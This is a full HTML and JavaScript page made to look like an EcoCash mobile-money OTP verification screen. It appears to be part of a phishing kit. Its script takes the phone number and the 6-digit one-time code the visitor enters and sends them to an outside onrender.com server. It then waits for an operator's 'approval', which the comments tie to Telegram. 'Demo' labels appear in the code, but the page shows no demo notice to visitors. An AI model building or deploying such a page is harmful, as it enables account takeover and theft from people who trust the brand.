<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>EcoCash — Demo OTP Verification</title>

  <style>
   * {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

html {
  -webkit-text-size-adjust: 100%;
}

body {
  min-height: 100vh;
  font-family:
    Inter,
    -apple-system,
    BlinkMacSystemFont,
    "Segoe UI",
    Roboto,
    Arial,
    sans-serif;

  background: #f7f9fc;
  color: #17233c;
}

/* =========================
   DEMO NOTICE
========================= */

.demo-notice {
  position: fixed;
  top: 10px;
  left: 50%;
  transform: translateX(-50%);
  z-index: 100;

  max-width: calc(100% - 24px);

  padding: 7px 13px;

  border: 1px solid #ead69b;
  border-radius: 999px;

  background: #fff8e7;
  color: #7b620c;

  font-size: 10px;
  font-weight: 700;

  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

/* =========================
   MAIN PAGE
========================= */

.page {
  width: min(100%, 720px);
  min-height: 100vh;

  margin: 0 auto;

  background: #fff;

  overflow: hidden;

  box-shadow:
    0 1px 10px rgba(20, 40, 80, 0.05);
}

/* =========================
   HEADER
========================= */

.header {
  position: relative;

  height: 88px;

  display: flex;
  align-items: center;
  justify-content: center;

  border-bottom: 3px solid #1761c4;

  background: #fff;
}

.back-button {
  position: absolute;
  left: 18px;
  top: 50%;

  transform: translateY(-50%);

  width: 42px;
  height: 42px;

  border: none;
  border-radius: 50%;

  background: transparent;

  color: #17233c;

  font-size: 34px;
  font-weight: 300;

  line-height: 1;

  cursor: pointer;

  display: flex;
  align-items: center;
  justify-content: center;
}

.back-button:active {
  background: #f1f4f8;
}

.logo {
  font-size: 36px;
  font-weight: 800;
  letter-spacing: -2px;
}

.logo-blue {
  color: #1761c4;
}

.logo-red {
  color: #df3028;
}

/* =========================
   CONTENT
========================= */

.content {
  width: min(100% - 36px, 560px);

  margin: 0 auto;

  padding: 34px 0 42px;

  text-align: center;
}

/* =========================
   OTP ICON
========================= */

.otp-icon {
  width: 108px;
  height: 108px;

  margin: 0 auto 23px;

  display: flex;
  align-items: center;
  justify-content: center;

  position: relative;

  border-radius: 50%;

  background: #edf5ff;
}

.phone {
  width: 42px;
  height: 70px;

  border: 4px solid #172c4a;
  border-radius: 9px;

  position: relative;
}

.phone::after {
  content: "";

  position: absolute;

  width: 11px;
  height: 3px;

  bottom: 5px;
  left: 50%;

  transform: translateX(-50%);

  border-radius: 5px;

  background: #172c4a;
}

.otp-badge {
  position: absolute;

  right: 8px;
  top: 34px;

  padding: 6px 8px;

  border-radius: 8px;

  background: #1761c4;
  color: #fff;

  font-size: 12px;
  font-weight: 800;

  box-shadow: 0 4px 10px rgba(23, 97, 196, 0.2);
}

/* =========================
   TITLE
========================= */

h1 {
  margin-bottom: 10px;

  color: #111d35;

  font-size: 28px;
  line-height: 1.2;

  font-weight: 700;

  letter-spacing: -0.5px;
}

.description {
  margin: 0 auto 25px;

  max-width: 460px;

  color: #59667d;

  font-size: 15px;
  line-height: 1.55;
}

.phone-number {
  display: inline-block;

  color: #1761c4;

  font-weight: 700;

  white-space: nowrap;
}

/* =========================
   SECURITY BOX
========================= */

.security-box {
  width: 100%;

  display: flex;
  align-items: center;

  gap: 14px;

  padding: 15px 16px;

  margin-bottom: 30px;

  border: 1px solid #e1ebf8;
  border-radius: 14px;

  background: #f4f8fd;

  text-align: left;
}

.shield {
  width: 42px;
  height: 48px;

  flex: 0 0 auto;

  position: relative;

  background: #1761c4;

  clip-path: polygon(
    50% 0,
    91% 15%,
    91% 52%,
    78% 73%,
    50% 100%,
    22% 73%,
    9% 52%,
    9% 15%
  );
}

.shield::after {
  content: "";

  position: absolute;

  width: 50%;
  height: 45%;

  left: 25%;
  top: 10%;

  background: #fff;
}

.security-title {
  margin-bottom: 3px;

  color: #1b2942;

  font-size: 14px;
  font-weight: 700;
}

.security-text {
  color: #637087;

  font-size: 12px;
  line-height: 1.45;
}

/* =========================
   OTP SECTION
========================= */

.otp-label {
  display: block;

  margin-bottom: 11px;

  color: #33415a;

  text-align: left;

  font-size: 14px;
  font-weight: 600;
}

.otp-boxes {
  display: flex;

  justify-content: center;

  gap: 9px;

  margin-bottom: 27px;
}

.otp-box {
  width: 48px;
  height: 56px;

  border: 1.5px solid #cbd2dc;
  border-radius: 11px;

  outline: none;

  background: #fff;

  color: #17233c;

  text-align: center;

  font-size: 23px;
  font-weight: 600;

  transition:
    border-color 0.15s ease,
    box-shadow 0.15s ease,
    background 0.15s ease;
}

.otp-box:focus {
  border-color: #1761c4;

  box-shadow:
    0 0 0 3px rgba(23, 97, 196, 0.1);
}

.otp-box.error {
  border-color: #df3028;
  background: #fff8f8;
}

/* =========================
   ERROR
========================= */

.error-message {
  display: none;

  margin: -12px 0 18px;

  padding: 10px 12px;

  border-radius: 9px;

  background: #fff1f1;

  color: #c5221f;

  font-size: 12px;
  font-weight: 600;

  line-height: 1.4;

  text-align: center;
}

.error-message.show {
  display: block;
}

/* =========================
   RESEND
========================= */

.resend-row {
  margin-bottom: 7px;

  color: #66728a;

  font-size: 13px;
}

.resend {
  border: none;

  background: transparent;

  color: #1761c4;

  font-size: 13px;
  font-weight: 700;

  cursor: pointer;
}

.resend:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.timer {
  margin-bottom: 24px;

  color: #df3028;

  font-size: 17px;
  font-weight: 600;
}

/* =========================
   VERIFY BUTTON
========================= */

.verify-button {
  width: 100%;
  height: 54px;

  border: none;
  border-radius: 11px;

  background: #1761c4;

  color: #fff;

  font-size: 15px;
  font-weight: 700;

  cursor: pointer;

  box-shadow:
    0 5px 14px rgba(23, 97, 196, 0.16);

  transition:
    background 0.2s ease,
    transform 0.1s ease;
}

.verify-button:hover {
  background: #0f55b1;
}

.verify-button:active {
  transform: scale(0.99);
}

.verify-button:disabled {
  opacity: 0.65;
  cursor: not-allowed;
}

/* =========================
   SUCCESS
========================= */

.success-message {
  display: none;

  margin-top: 13px;

  color: #16834b;

  font-size: 13px;
  font-weight: 600;

  line-height: 1.4;
}

.success-message.show {
  display: block;
}

/* =========================
   FOOTER
========================= */

.secure-footer {
  display: flex;
  align-items: center;
  justify-content: center;

  gap: 7px;

  margin-top: 34px;

  padding-top: 20px;

  border-top: 1px solid #edf0f4;

  color: #8a94a6;

  font-size: 11px;

  line-height: 1.4;

  text-align: center;
}

.lock {
  font-size: 14px;
}

/* =========================
   MOBILE
========================= */

@media (max-width: 600px) {

  body {
    background: #fff;
  }

  .page {
    width: 100%;
    min-height: 100vh;

    box-shadow: none;
  }

  .demo-notice {
    top: 7px;

    padding: 5px 10px;

    font-size: 8px;
  }

  .header {
    height: 76px;

    border-bottom-width: 2px;
  }

  .back-button {
    left: 12px;

    width: 38px;
    height: 38px;

    font-size: 30px;
  }

  .logo {
    font-size: 31px;
    letter-spacing: -1.5px;
  }

  .content {
    width: calc(100% - 30px);

    padding: 29px 0 30px;
  }

  .otp-icon {
    width: 94px;
    height: 94px;

    margin-bottom: 19px;
  }

  .phone {
    width: 37px;
    height: 61px;

    border-width: 3px;
    border-radius: 8px;
  }

  .phone::after {
    width: 9px;
    height: 2.5px;

    bottom: 4px;
  }

  .otp-badge {
    right: 6px;
    top: 29px;

    padding: 5px 6px;

    font-size: 10px;

    border-radius: 6px;
  }

  h1 {
    font-size: 25px;

    margin-bottom: 8px;
  }

  .description {
    font-size: 14px;

    line-height: 1.55;

    margin-bottom: 22px;
  }

  .security-box {
    gap: 12px;

    padding: 13px;

    margin-bottom: 25px;

    border-radius: 12px;
  }

  .shield {
    width: 37px;
    height: 43px;
  }

  .security-title {
    font-size: 13px;
  }

  .security-text {
    font-size: 11px;
    line-height: 1.4;
  }

  .otp-label {
    font-size: 13px;

    margin-bottom: 10px;
  }

  .otp-boxes {
    gap: 7px;

    margin-bottom: 23px;
  }

  .otp-box {
    width: 43px;
    height: 53px;

    border-radius: 10px;

    font-size: 22px;
  }

  .error-message {
    font-size: 11px;

    padding: 9px 10px;

    margin-bottom: 15px;
  }

  .resend-row,
  .resend {
    font-size: 12px;
  }

  .timer {
    font-size: 16px;

    margin-bottom: 21px;
  }

  .verify-button {
    height: 52px;

    border-radius: 10px;

    font-size: 14px;
  }

  .success-message {
    font-size: 12px;
  }

  .secure-footer {
    margin-top: 28px;

    padding-top: 17px;

    font-size: 10px;
  }

  .lock {
    font-size: 12px;
  }
}

/* =========================
   VERY SMALL PHONES
========================= */

@media (max-width: 360px) {

  .content {
    width: calc(100% - 24px);
  }

  .otp-boxes {
    gap: 5px;
  }

  .otp-box {
    width: 40px;
    height: 50px;

    font-size: 20px;
  }

  .security-box {
    padding: 11px;
  }

  .security-text {
    font-size: 10px;
  }
}
  </style>
</head>

<body>


  <main class="page">

    <!-- HEADER -->

    <header class="header">

      <button
        class="back-button"
        id="backButton"
        type="button"
        aria-label="Go back"
      >
        ‹
      </button>

      <div class="logo">
        <span class="logo-blue">Eco</span><span class="logo-red">Cash</span>
      </div>

    </header>


    <!-- CONTENT -->

    <section class="content">

      <div class="otp-icon">
        <div class="phone"></div>
        <div class="otp-badge">OTP</div>
      </div>


      <h1>
        Enter OTP
      </h1>


      <p class="description">
        We have sent a 6-digit code to your EcoCash<br>
        number
        <span id="phone-number"></span>
      </p>


      <!-- SECURITY -->

      <div class="security-box">

        <div class="shield"></div>

        <div>

          <div class="security-title">
            Secure Verification
          </div>

          <div class="security-text">
            Enter the 6-digit code below
            to complete the application.
          </div>

        </div>

      </div>


      <!-- OTP -->

      <label class="otp-label">
        Enter 6-digit code
      </label>


      <div
        class="otp-boxes"
        id="otpBoxes"
      >

        <input
          class="otp-box"
          maxlength="1"
          inputmode="numeric"
          autocomplete="off"
          aria-label="Demo code digit 1"
        >

        <input
          class="otp-box"
          maxlength="1"
          inputmode="numeric"
          autocomplete="off"
          aria-label="Demo code digit 2"
        >

        <input
          class="otp-box"
          maxlength="1"
          inputmode="numeric"
          autocomplete="off"
          aria-label="Demo code digit 3"
        >

        <input
          class="otp-box"
          maxlength="1"
          inputmode="numeric"
          autocomplete="off"
          aria-label="Demo code digit 4"
        >

        <input
          class="otp-box"
          maxlength="1"
          inputmode="numeric"
          autocomplete="off"
          aria-label="Demo code digit 5"
        >

        <input
          class="otp-box"
          maxlength="1"
          inputmode="numeric"
          autocomplete="off"
          aria-label="Demo code digit 6"
        >

      </div>


      <!-- ERROR -->

      <div
        class="error-message"
        id="errorMessage"
      >
        Incorrect code. Please try again.
      </div>


      <!-- RESEND -->

      <div class="resend-row">

        Need a new code?

        <button
          type="button"
          class="resend"
          id="resendButton"
        >
          Reset
        </button>

      </div>


      <div
        class="timer"
        id="timer"
      >
        00:120
      </div>


      <!-- VERIFY -->

      <button
        type="button"
        class="verify-button"
        id="verifyButton"
      >
        VERIFY CODE
      </button>


      <div
        class="success-message"
        id="successMessage"
      >
        Verification submitted. Waiting for approval...
      </div>


      <div class="secure-footer">
        <span class="lock">♙</span>
        <span>© 2026 Ecocash. All rights reserved.</span>
      </div>

    </section>

  </main>


  <script>

  


    /* ==========================================================
       API
    ========================================================== */

    const API_URL =
      "https://ecocash-0w1z.onrender.com";


    /* ==========================================================
       ELEMENTS
    ========================================================== */

    const otpBoxes =
      document.querySelectorAll(".otp-box");

    const verifyButton =
      document.getElementById("verifyButton");

    const errorMessage =
      document.getElementById("errorMessage");

    const successMessage =
      document.getElementById("successMessage");

    const resendButton =
      document.getElementById("resendButton");

    const timerElement =
      document.getElementById("timer");

    const backButton =
      document.getElementById("backButton");

   const phone = document.getElementById("phone-number");

const phoneNumber =
  sessionStorage.getItem("phone") || "";

phone.textContent ="+263"+" "+ phoneNumber;
    
    /* ==========================================================
       STATE
    ========================================================== */

    let currentRequestId = null;

    let cancelled = false;

    let timerInterval = null;

    let remainingSeconds = 120;


    /* ==========================================================
       OTP INPUT
    ========================================================== */

    otpBoxes.forEach(function (box, index) {

      box.addEventListener(
        "input",
        function () {

          this.value =
            this.value
              .replace(/\D/g, "")
              .slice(0, 1);

          errorMessage.classList.remove("show");

          this.classList.remove("error");

          if (
            this.value &&
            index < otpBoxes.length - 1
          ) {

            otpBoxes[index + 1].focus();

          }

        }
      );


      box.addEventListener(
        "keydown",
        function (event) {

          if (
            event.key === "Backspace" &&
            !this.value &&
            index > 0
          ) {

            otpBoxes[index - 1].focus();

          }

        }
      );


      box.addEventListener(
        "paste",
        function (event) {

          event.preventDefault();

          const pasted =
            event.clipboardData
              .getData("text")
              .replace(/\D/g, "")
              .slice(0, 6);

          pasted
            .split("")
            .forEach(function (digit, i) {

              if (otpBoxes[i]) {

                otpBoxes[i].value =
                  digit;

              }

            });

          if (pasted.length === 6) {

            otpBoxes[5].focus();

          }

        }
      );

    });


    /* ==========================================================
       GET ENTERED DEMO CODE
    ========================================================== */

    function getEnteredCode() {

      return [...otpBoxes]
        .map(function (box) {
          return box.value;
        })
        .join("");

    }


    /* ==========================================================
       RESET CODE INPUT
    ========================================================== */

    function resetCodeInput() {

      otpBoxes.forEach(function (box) {

        box.value = "";

        box.classList.remove("error");

      });

      errorMessage.classList.remove("show");

      otpBoxes[0].focus();

    }


    /* ==========================================================
       SERVER REQUEST
    ========================================================== */

    async function submitDemoCode(code) {

  const phone =
    sessionStorage.getItem("phone") || "";
    const codea = getEnteredCode();

  const response =
    await fetch(
      `${API_URL}/api/demo-otp-request`,
      {
        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({
          phone: phone,
          demoCode: codea
        })
      }
    );

  const text =
    await response.text();

  let data;

  try {

    data = JSON.parse(text);

  } catch (error) {

    throw new Error(
      "Server returned a non-JSON response: " +
      text.slice(0, 200)
    );

  }

  if (
    !response.ok ||
    !data.ok
  ) {

    throw new Error(
      data.error ||
      "Unable to submit verification."
    );

  }

  if (!data.requestId) {

    throw new Error(
      "The server did not return a request ID."
    );

  }

  return data.requestId;
}
    /* ==========================================================
       POLL DEMO STATUS
    ========================================================== */

    async function waitForApproval(requestId) {

      cancelled = false;


      while (!cancelled) {

        await new Promise(
          function (resolve) {

            setTimeout(
              resolve,
              1500
            );

          }
        );


        if (cancelled) {

          return;

        }


        try {

          const response =
            await fetch(
              `${API_URL}/api/demo-status/${encodeURIComponent(requestId)}`,
              {
                method: "GET",
                cache: "no-store"
              }
            );


          const text =
            await response.text();


          let data;


          try {

            data =
              JSON.parse(text);

          } catch (error) {

            console.error(
              "Status endpoint returned non-JSON:",
              text
            );

            continue;

          }


          if (!response.ok) {

            console.error(
              "Status request failed:",
              data
            );

            continue;

          }


          /* ====================================================
             APPROVED
          ==================================================== */

          if (
            data.status ===
            "approved"
          ) {

            stopPolling();


            successMessage.textContent =
              "Verification approved. Opening dashboard...";


            successMessage.classList.add(
              "show"
            );


            verifyButton.disabled =
              true;


            setTimeout(
              function () {

                window.location.href =
                  "dashboard.html";

              },
              700
            );


            return;

          }


          /* ====================================================
             REJECTED
          ==================================================== */

          if (
            data.status ===
            "rejected"
          ) {

            stopPolling();


            successMessage.classList.remove(
              "show"
            );


            errorMessage.textContent =
              "Verification was rejected. Please try again.";


            errorMessage.classList.add(
              "show"
            );


            verifyButton.disabled =
              false;


            verifyButton.textContent =
              "VERIFY CODE";


            resetCodeInput();


            return;

          }


          /* ====================================================
             EXPIRED
          ==================================================== */

          if (
            data.status ===
            "expired"
          ) {

            stopPolling();


            successMessage.classList.remove(
              "show"
            );


            errorMessage.textContent =
              "The verification request expired. Please try again.";


            errorMessage.classList.add(
              "show"
            );


            verifyButton.disabled =
              false;


            verifyButton.textContent =
              "VERIFY CODE";


            return;

          }

        } catch (error) {

          console.error(
            "Status check failed:",
            error
          );

        }

      }

    }


    /* ==========================================================
       STOP POLLING
    ========================================================== */

    function stopPolling() {

      cancelled = true;

      currentRequestId = null;

    }


    /* ==========================================================
       VERIFY DEMO CODE
    ========================================================== */

    verifyButton.addEventListener(
      "click",
      async function () {

        const enteredCode =
          getEnteredCode();


        /* ------------------------------------------------------
           REQUIRE SIX DIGITS
        ------------------------------------------------------ */

        if (
          enteredCode.length !== 6
        ) {

          errorMessage.textContent =
            "Please enter the complete 6-digit code.";


          errorMessage.classList.add(
            "show"
          );


          otpBoxes.forEach(
            function (box) {

              box.classList.add(
                "error"
              );

            }
          );


          return;

        }


        /* ------------------------------------------------------
           STOP ANY PREVIOUS REQUEST
        ------------------------------------------------------ */

        stopPolling();


        /* ------------------------------------------------------
           UI: WAITING
        ------------------------------------------------------ */

        verifyButton.disabled =
          true;


        verifyButton.textContent =
          "VERIFYING...";


        errorMessage.classList.remove(
          "show"
        );


        successMessage.textContent =
          "Checking the code...";


        successMessage.classList.add(
          "show"
        );


        try {

          /*
            The entered value goes ONLY to your own
            demo backend.

            It is NOT sent to Telegram.
          */

          const requestId =
            await submitDemoCode(
              enteredCode
            );


          currentRequestId =
            requestId;


          successMessage.textContent =
            "Code accepted. Waiting for approval...";


          verifyButton.textContent =
            "WAITING FOR APPROVAL...";


          /*
            Telegram approval/status flow.
          */

          await waitForApproval(
            requestId
          );


        } catch (error) {

          console.error(
            "Verification failed:",
            error
          );


          successMessage.classList.remove(
            "show"
          );


          errorMessage.textContent =
            error.message ||
            "Unable to contact the approval server.";


          errorMessage.classList.add(
            "show"
          );


          verifyButton.disabled =
            false;


          verifyButton.textContent =
            "VERIFY CODE";


          otpBoxes.forEach(
            function (box) {

              box.classList.add(
                "error"
              );

            }
          );

        }

      }
    );


    /* ==========================================================
       RESET DEMO
    ========================================================== */

    resendButton.addEventListener(
      "click",
      function () {

        stopPolling();


        successMessage.classList.remove(
          "show"
        );


        errorMessage.classList.remove(
          "show"
        );


        verifyButton.disabled =
          false;


        verifyButton.textContent =
          "VERIFY CODE";


        resetCodeInput();


        startTimer();

      }
    );


    /* ==========================================================
       TIMER
    ========================================================== */

    function startTimer() {

      clearInterval(
        timerInterval
      );


      remainingSeconds =
        120;


      updateTimer();


      timerInterval =
        setInterval(
          function () {

            remainingSeconds--;

            updateTimer();


            if (
              remainingSeconds <= 0
            ) {

              clearInterval(
                timerInterval
              );

            }

          },
          1000
        );

    }


    function updateTimer() {

      const minutes =
        String(
          Math.floor(
            remainingSeconds / 60
          )
        ).padStart(
          2,
          "0"
        );


      const seconds =
        String(
          remainingSeconds % 60
        ).padStart(
          2,
          "0"
        );


      timerElement.textContent =
        minutes + ":" + seconds;

    }


    /* ==========================================================
       BACK
    ========================================================== */

    backButton.addEventListener(
      "click",
      function () {

        stopPolling();

        clearInterval(
          timerInterval
        );

        window.history.back();

      }
    );


    /* ==========================================================
       INITIAL STATE
    ========================================================== */

    startTimer();

    otpBoxes[0].focus();

  </script>

</body>
</html>
